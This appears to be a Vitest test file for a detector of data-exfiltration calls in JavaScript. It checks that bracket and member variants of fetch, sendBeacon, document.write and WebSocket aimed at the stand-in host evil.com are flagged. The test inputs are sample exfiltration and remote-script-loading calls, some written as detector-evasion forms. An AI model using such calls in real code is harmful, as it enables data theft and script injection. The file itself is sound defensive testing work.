import { describe, it, expect } from 'vitest';
import { parseJs } from '../../ast/parse.js';
import { detectExfilCalls } from '../detect-exfil-calls.js';
import type { DetectorContext } from '../../ast/types.js';

const MAIN = 'mysite.com';
const ctx = (source: string): DetectorContext => ({ source, relPath: 't.js', mainHost: MAIN });
const has = (src: string, threat: string): boolean => {
  const ast = parseJs(src, 't.js')!;
  return detectExfilCalls(ast, ctx(src)).some((r) => r.threatType === threat);
};

describe('DET-2 — member/bracket формы обходят детектор', () => {
  it('window.fetch(external)', () => {
    expect(has(`window.fetch('//evil.com/x')`, 'exfil-fetch')).toBe(true);
  });
  it("window['fetch'](external)", () => {
    expect(has(`window['fetch']('//evil.com/x')`, 'exfil-fetch')).toBe(true);
  });
  it('self.fetch(external)', () => {
    expect(has(`self.fetch('https://evil.com/x')`, 'exfil-fetch')).toBe(true);
  });
  it("navigator['sendBeacon'](external)", () => {
    expect(has(`navigator['sendBeacon']('//evil.com/b')`, 'exfil-beacon')).toBe(true);
  });
  it("document['write'](внешний script)", () => {
    expect(has(`document['write']('<script src="//evil.com/x"></script>')`, 'exfil-document-write')).toBe(true);
  });
  it('new window.WebSocket(external)', () => {
    expect(has(`new window.WebSocket('wss://evil.com/s')`, 'exfil-websocket')).toBe(true);
  });

  it('НЕ-регресс: прямые формы по-прежнему ловятся', () => {
    expect(has(`fetch('//evil.com/x')`, 'exfil-fetch')).toBe(true);
    expect(has(`navigator.sendBeacon('//evil.com/b')`, 'exfil-beacon')).toBe(true);
  });
  it('НЕ-регресс: window.fetch на локальный хост НЕ ловится', () => {
    expect(has(`window.fetch('/api/local')`, 'exfil-fetch')).toBe(false);
  });
});
